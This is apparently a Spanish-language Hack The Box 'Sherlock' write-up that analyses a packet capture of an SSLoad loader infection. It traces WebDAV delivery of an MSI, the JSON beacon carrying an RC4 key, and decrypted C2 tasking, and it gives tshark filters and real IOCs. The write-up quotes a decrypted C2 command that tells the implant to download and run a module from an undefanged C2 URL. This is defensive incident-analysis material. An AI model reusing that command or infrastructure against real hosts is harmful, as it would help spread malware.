---
sherlock: Interceptor
domain: SOC / Red
difficulty: Easy
platform: Hack The Box
evidence: Captura de tráfico de una infección con SSLoad
tools: [Wireshark, tshark, CyberChef, Python]
state: Retired
tags: [dfir, soc, pcap, webdav, msi, ssload, rc4, malware-triage]
---

# Interceptor — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> Investigación defensiva. Sin respuestas literales de la plataforma.

## Escenario

El SOC detecta tráfico HTTP saliente desde un puesto interno (`10.4.17.101`) hacia una IP poco habitual. La captura contiene la infección completa de un cargador **SSLoad**: descarga de un **MSI** por **WebDAV**, ejecución con `msiexec` y C2 en HTTP con el cuerpo cifrado en **RC4**.

## Evidencias

- `interceptor.pcap`.

## Investigación

### 1. La descarga

El primer salto es HTTP en claro contra `87.249.49[.]206`, con `OPTIONS` y **`PROPFIND`** (WebDAV) antes del `GET` del paquete:

```bash
tshark -r interceptor.pcap -Y 'http.request' \
  -T fields -e frame.number -e ip.dst -e http.request.method -e http.request.uri
```

El fichero es **`avp.msi`**; su marca de tiempo interna es de **2009**, un cargador viejo reutilizado. Dentro va `forcedelctl.dll`. La ejecución la hace `msiexec.exe`, un binario legítimo de Windows: no hay exploit, hay una instalación.

### 2. El balizamiento

Antes de hablar con el C2, el implante consulta un servicio de IP pública (`api[.]ipify[.]org`) para conocer su salida a Internet. El primer contacto con el C2 es **JSON sin cifrar** (frame 12608): hostname, versión de Windows, usuario y **la clave RC4 en claro**.

```bash
tshark -r interceptor.pcap -Y 'frame.number == 12608' -T fields -e http.file_data
```

Clave: `WkZPxBoH6CA3Ok4iI`.

### 3. El tasking

El servidor (`85.239.53[.]219`) responde con un blob **base64**; decodificado y pasado por RC4 con esa clave sale el comando:

```json
{"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
```

```bash
tshark -r interceptor.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data | head
```

### 4. Alcance

Con el JSON descifrado se documentan C2, URL de segundo stage, nombres de módulos y la clave. La cadena completa es: WebDAV → MSI → `msiexec` → baliza JSON → tasking RC4 → descarga del módulo 2.

## Conclusiones

Infección por **SSLoad** entregada como MSI desde un WebDAV: la clave RC4 viaja en el propio balizamiento, así que el C2 se descifra sin muestrear el binario. El host comprometido es `10.4.17.101`, el distribuidor `87.249.49[.]206` y el C2 `85.239.53[.]219`.

## Lecciones

- WebDAV (`PROPFIND`/`OPTIONS`) es un canal de entrega habitual: muchas redes permiten los métodos y no inspeccionan el cuerpo.
- Un MSI ejecutado por el usuario es ejecución de código sin vulnerabilidad: la defensa es la reputación y el control de descargas.
- Si el implante manda su clave en el registro inicial, el análisis del PCAP basta; no hace falta muestra.

## Qué enseña

- Los cargadores viejos siguen funcionando: la fecha del PE no es un IOC de descarte.
- El C2 en HTTP claro con JSON delata la fase de registro; el cifrado llega después.
- Documentar clave, C2 y URL de stage es lo que convierte el PCAP en IOCs.

## Tropiezos

- **Frames**: el balizamiento y el tasking están en frames concretos (12607/12608/12610); filtrar por `frame.number` evita releer todo el flujo.
- **Base64 + RC4**: son dos pasos; decodificar sin descifrar deja bytes con aspecto aleatorio.
- **Ruido**: separar el tráfico de actualizaciones por `User-Agent` y destino antes de leer cuerpos.
